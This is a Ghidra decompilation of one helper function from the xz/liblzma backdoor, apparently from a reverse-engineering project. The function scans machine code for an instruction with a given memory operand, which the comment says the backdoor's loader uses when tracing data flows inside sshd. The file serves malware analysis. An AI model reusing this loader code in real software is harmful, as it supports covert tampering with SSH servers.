// /home/kali/xzre-ghidra/xzregh/101060_find_instruction_with_mem_operand_ex.c
// Function: find_instruction_with_mem_operand_ex @ 0x101060
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_instruction_with_mem_operand_ex(u8 * code_start, u8 * code_end, dasm_ctx_t * dctx, int opcode, void * mem_address)


/*
 * AutoDoc: Performs a generic sweep for any instruction that touches memory, applying a caller-supplied predicate to filter the operands. The loader routes specialised searches through it when reconstructing complex data flows in sshd.
 */

#include "xzre_types.h"

BOOL find_instruction_with_mem_operand_ex
               (u8 *code_start,u8 *code_end,dasm_ctx_t *dctx,int opcode,void *mem_address)

{
  BOOL BVar1;
  long lVar2;
  dasm_ctx_t *pdVar3;
  byte bVar4;
  dasm_ctx_t local_80;
  
  bVar4 = 0;
  BVar1 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0xd6,4,0xe,FALSE);
  if (BVar1 != FALSE) {
    pdVar3 = &local_80;
    for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
      *(undefined4 *)&pdVar3->instruction = 0;
      pdVar3 = (dasm_ctx_t *)((long)pdVar3 + ((ulong)bVar4 * -2 + 1) * 4);
    }
    if (dctx == (dasm_ctx_t *)0x0) {
      dctx = &local_80;
    }
    for (; code_start < code_end; code_start = code_start + 1) {
      BVar1 = x86_dasm(dctx,code_start,code_end);
      if ((((BVar1 != FALSE) && (*(int *)(dctx->opcode_window + 3) == opcode)) &&
          (((dctx->prefix).decoded.modrm.modrm_word & 0xff00ff00) == 0x5000000)) &&
         ((mem_address == (void *)0x0 ||
          ((((dctx->prefix).decoded.flags2 & 1) != 0 &&
           ((u8 *)mem_address == dctx->instruction + dctx->instruction_size + dctx->mem_disp)))))) {
        return TRUE;
      }
    }
  }
  return FALSE;
}

